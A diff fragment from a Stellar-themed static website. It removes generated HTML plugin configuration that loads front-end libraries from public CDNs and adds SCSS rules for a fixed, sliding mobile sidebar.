-    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@10.3/swiper-bundle.min.css","js":"https://unpkg.com/swiper@10.3/swiper-bundle.min.js"});
+  .l_body .l_left {
+    position: fixed;
+    transform: translateX(-320px);
+    margin: 0;
+    left: 8px;
+    box-shadow: $boxshadow-card-float;
+    z-index: 10;
   }
-  if ('' == 'true') {
-    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.bootcdn.net/ajax/libs/scrollReveal.js/4.0.9/scrollreveal.min.js","distance":"16px","duration":800,"interval":100,"scale":1});
+  .l_body .l_main {
+    max-width: 100%;
   }
-  if ('true' == 'true') {
-    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","flying_pages":"https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"});
+  .l_body.mobile .l_left {
+    transition: transform 0.38s ease-out;
   }
-  if ('true' == 'true') {
-    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js","css":"https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css","selector":null});
+  .l_body.mobile.sidebar .l_left {
+    transform: translateX(0px);
   }
-  if ('false' == 'true') {
-    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  .l_body.mobile.sidebar .main-mask {
+    opacity: 1;
+    pointer-events: inherit;
   }
-  if ('true' == 'true') {
-    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied","toast":"复制成功"});
-  }
-</script>
-
-<!-- required -->
-<script src="/js/main.js?v=1.26.8" async></script>
-
-<!-- optional -->
-
-
-
-
-
-
-<!-- inject -->
-<script type="text/javascript" src="/custom/js/ZYCode.js"></script>
-</div></body></html>
+}
